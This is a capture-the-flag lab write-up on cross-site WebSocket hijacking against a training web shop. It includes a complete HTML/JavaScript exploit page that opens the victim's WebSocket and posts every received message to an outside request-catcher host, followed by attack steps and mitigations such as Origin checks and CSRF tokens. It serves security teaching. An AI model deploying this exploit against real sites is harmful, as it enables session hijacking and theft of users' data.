# Cowbell Shop 4 - CSWSH

## Challenge

Hijack another user WebSocket connection with an CSRF attack.

## Answer

### Explain the security problem 

* Web Sockets do not adhere to the same origin policy
* Any domain can open a web socket connection to another domain and send/receive data

### Explain your attack. \(exploit, screenshot, hacking journal\)  

Step 1-3\) Setup Hacking-Environment.  Open a Request Catcher and Theia Web IDE

Step 4\)  Changed the `change_me.html` file to:

{% code title="change\_me.html" %}
```markup
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>CSWSH</title>
  </head>
  <body>
    <h1>CSWSH</h1>
    <p>You got hacked!</p>
    <script type="text/javascript">
      var socket = new WebSocket(
        "wss://1b747ea1-3a09-4acc-8d8a-031e2fd2e267.idocker.vuln.land/socket.io/?EIO=3&transport=websocket"
      );
      socket.onopen = function(openEvent) {
        console.log(openEvent);
      };
      socket.onmessage = function(msgEvent) {
        console.log(msgEvent.data);
        var oReq = new XMLHttpRequest();
        oReq.open(
          "POST",
          "https://9a471a99-a077-47e4-a454-f7e6676acc1f.idocker.vuln.land/extractedData"
        );
        oReq.send(JSON.stringify(msgEvent.data));
      };
      socket.onerror = function(errEvent) {
        console.log(errEvent);
      };
    </script>
  </body>
</html>
```
{% endcode %}

Step 5\) Open webshop in new Incognito Tab and login in as the attacker

Step 6\) Pass the attackers url `https://16dfe2ff-d02a-4a24-8d06-21e07055a9af.idocker.vuln.land/change_me.html`  to the victim. Victim opens the url and gets the following output:  


![](../../.gitbook/assets/image%20%28376%29.png)

![](../../.gitbook/assets/image%20%28377%29.png)

Step 8\) check in the Request Catcher logs the flag received from the victim

![](../../.gitbook/assets/image%20%28380%29.png)



### Explain mitigation \(remedy\)

* Check the Origin header of the WebSocket handshake request on the server, since that header was designed to protect the server against attacker-initiated cross-site connections of victim browsers!
* Use **session-individual random tokens \(like CSRF-Tokens\)** on the handshake request and verify them on the server.
  * Embed the token into one of the HTML pages of your web application.
  * Create a REST endpoint where your client can fetch the token



### Answers

#### Are the CORS errors a problem for the attacker?

No, since WebSockets are not subordinated to CORS 

#### Explain the meaning of the errors

The access to the `/extractedData` target site from the `origin` is not allowed, since there is not Acces-Control-Allow-Origin HTTP Response Header present on the target site and therefore it violates the CORS policy

#### How do we mitigate the risk of a web socket based XSRF attack?

See above \(CSRF-Tokens with validation on server\)

